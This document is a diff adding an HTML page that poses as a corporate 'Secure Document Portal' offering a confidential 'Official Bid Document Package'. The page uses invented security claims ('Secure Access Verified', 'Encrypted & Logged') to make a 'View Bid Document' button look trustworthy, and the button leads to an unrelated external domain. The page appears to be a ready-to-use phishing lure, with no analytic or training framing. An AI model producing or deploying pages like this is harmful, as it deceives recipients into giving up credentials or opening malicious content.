@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Document Portal</title>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .bg-corporate-blue { background-color: #0078d4; }
+    .bg-document-frame { background-color: #f0f4fa; }
+    .border-document-border { border-color: #d0d7e2; }
+    .text-corporate-blue { color: #0078d4; }
+    .text-muted-foreground { color: #6b7280; }
+    .bg-muted { background-color: #f9fafb; }
+    .bg-security-accent\/5 { background-color: rgba(0, 120, 212, 0.05); }
+    .border-security-accent\/20 { border-color: rgba(0, 120, 212, 0.2); }
+    .bg-corporate-blue-dark { background-color: #005a9e; }
+  </style>
+</head>
+<body class="min-h-screen bg-white text-gray-900">
+
+  <!-- Header -->
+  <header class="border-b border-document-border bg-white">
+    <div class="max-w-6xl mx-auto px-4 py-4 flex items-center gap-3">
+      <div class="h-8 w-8 bg-corporate-blue rounded-sm flex items-center justify-center">
+        <i data-lucide="file-text" class="text-white w-5 h-5"></i>
+      </div>
+      <div>
+        <h1 class="text-lg font-semibold">Secure Document Portal</h1>
+        <p class="text-sm text-muted-foreground">Authorized Access Only</p>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-6xl mx-auto px-4 py-12">
+    <!-- Security Notice -->
+    <div class="border border-security-accent/20 bg-security-accent/5 rounded-md mb-8 p-6">
+      <div class="flex items-start gap-4">
+        <div class="flex-shrink-0">
+          <i data-lucide="shield" class="w-6 h-6 text-corporate-blue"></i>
+        </div>
+        <div>
+          <h3 class="font-semibold mb-2">Secure Access Verified</h3>
+          <p class="text-sm text-muted-foreground">
+            This document is secure and accessible only to authorized recipients who received 
+            this link directly. Your access has been verified and logged for security purposes.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Document Card -->
+    <div class="border border-document-border shadow-lg rounded-md">
+      <!-- Header -->
+      <div class="bg-document-frame border-b border-document-border p-4">
+        <div class="flex items-center gap-3">
+          <div class="h-10 w-10 bg-corporate-blue rounded flex items-center justify-center">
+            <i data-lucide="file-text" class="text-white w-6 h-6"></i>
+          </div>
+          <div>
+            <h2 class="text-xl font-semibold">Official Bid Document Package</h2>
+            <p class="text-sm text-muted-foreground">Confidential Business Proposal</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Content -->
+      <div class="p-8">
+        <!-- Info Grid -->
+        <div class="grid md:grid-cols-2 gap-6 mb-8">
+          <div class="space-y-4">
+            <div class="flex items-center gap-3">
+              <i data-lucide="file-text" class="w-5 h-5 text-corporate-blue"></i>
+              <div>
+                <p class="font-medium">Document Length</p>
+                <p class="text-sm text-muted-foreground">7 pages</p>
+              </div>
+            </div>
+            <div class="flex items-center gap-3">
+              <i data-lucide="clock" class="w-5 h-5 text-corporate-blue"></i>
+              <div>
+                <p class="font-medium">Document Type</p>
+                <p class="text-sm text-muted-foreground">Formal Bidding Document</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="space-y-4">
+            <div class="flex items-center gap-3">
+              <i data-lucide="users" class="w-5 h-5 text-corporate-blue"></i>
+              <div>
+                <p class="font-medium">Access Level</p>
+                <p class="text-sm text-muted-foreground">Authorized Recipients Only</p>
+              </div>
+            </div>
+            <div class="flex items-center gap-3">
+              <i data-lucide="shield" class="w-5 h-5 text-corporate-blue"></i>
+              <div>
+                <p class="font-medium">Security Status</p>
+                <p class="text-sm text-muted-foreground">Encrypted & Logged</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Document Contents -->
+        <div class="mb-8">
+          <h3 class="font-semibold mb-4">Document Contents Include:</h3>
+          <div class="bg-muted rounded-lg p-4">
+            <ul class="space-y-2 text-sm text-muted-foreground">
+              <li class="flex items-center gap-2">
+                <span class="w-1.5 h-1.5 bg-corporate-blue rounded-full"></span>
+                Technical specifications and requirements
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="w-1.5 h-1.5 bg-corporate-blue rounded-full"></span>
+                Project timeline and milestones
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="w-1.5 h-1.5 bg-corporate-blue rounded-full"></span>
+                Evaluation criteria and scoring methodology
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="w-1.5 h-1.5 bg-corporate-blue rounded-full"></span>
+                Submission guidelines and deadlines
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="w-1.5 h-1.5 bg-corporate-blue rounded-full"></span>
+                Contact information and support details
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- CTA Button -->
+        <div class="text-center">
+          <a href="https://bluehatchi.eu/yNOnZXy/" target="_blank" class="inline-flex items-center justify-center bg-corporate-blue hover:bg-corporate-blue-dark text-white font-semibold px-8 py-3 text-lg rounded-md transition">
+            <i data-lucide="file-text" class="w-5 h-5 mr-2"></i>
+            View Bid Document
+            <i data-lucide="external-link" class="w-4 h-4 ml-2"></i>
+          </a>
+          <p class="text-xs text-muted-foreground mt-3">
+            Clicking will open the secure document in a new window
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="mt-8 text-center text-xs text-muted-foreground">
+      This is a secure document portal. All access is monitored and logged for compliance purposes. 
+      If you believe you received this link in error, please contact the sender immediately.
+    </div>
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
